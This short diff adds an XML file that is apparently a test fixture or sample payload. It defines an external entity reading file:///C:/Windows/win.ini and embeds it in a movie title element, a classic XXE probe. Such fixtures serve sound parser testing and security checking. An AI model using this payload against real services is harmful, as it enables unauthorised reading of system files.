@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
+<movie><title>&xxe;</title><year>2001</year></movie>
